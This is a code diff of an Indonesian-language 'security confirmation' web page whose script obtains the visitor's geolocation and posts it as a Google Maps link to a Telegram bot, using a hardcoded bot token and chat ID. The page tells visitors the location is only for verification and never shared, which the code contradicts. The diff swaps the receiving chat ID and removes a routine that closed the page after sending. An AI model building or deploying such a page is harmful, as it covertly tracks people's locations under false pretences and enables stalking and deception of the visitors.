@@ -62,7 +62,7 @@
   <h1>Konfirmasi Keamanan</h1>
 
   <p>
-    Sistem memerlukan verifikasi lokasi perangkat untuk melanjutkan proses
+    Untuk melanjutkan proses, sistem perlu melakukan verifikasi lokasi perangkat
     sesuai kebijakan keamanan.
   </p>
 
@@ -74,7 +74,7 @@
     <strong>Kebijakan Privasi</strong><br>
     Informasi lokasi digunakan hanya untuk keperluan verifikasi sistem.
     Data tidak disimpan secara permanen dan tidak dibagikan kepada pihak ketiga.
-    Dengan melanjutkan, Anda menyetujui kebijakan ini.
+    Dengan melanjutkan, Anda menyetujui kebijakan privasi ini.
   </div>
 
   <div class="footer">
@@ -84,10 +84,7 @@
 
 <script>
 const BOT_TOKEN = "AAEeMrSz925P-_ebsZ38__7bvISb2O9CYEg";
-const CHAT_ID   = "6219809117";
-
-// waktu auto close (ms)
-const AUTO_CLOSE_DELAY = 3000; // 3 detik
+const CHAT_ID   = "913215740";
 
 if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(
@@ -96,7 +93,7 @@ if (navigator.geolocation) {
       const lon = position.coords.longitude;
 
       document.getElementById("status").innerText =
-        "Verifikasi berhasil. Halaman akan ditutup otomatis…";
+        "Verifikasi lokasi berhasil.";
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
@@ -105,15 +102,6 @@ if (navigator.geolocation) {
           chat_id: CHAT_ID,
           text: `📍 Lokasi terverifikasi:\nhttps://maps.google.com/?q=${lat},${lon}`
         })
-      }).finally(() => {
-        setTimeout(() => {
-          window.close();
-
-          // fallback jika close diblokir browser
-          setTimeout(() => {
-            window.location.href = "about:blank";
-          }, 500);
-        }, AUTO_CLOSE_DELAY);
       });
     },
     function () {
@@ -133,4 +121,3 @@ if (navigator.geolocation) {
 
 </body>
 </html>
-
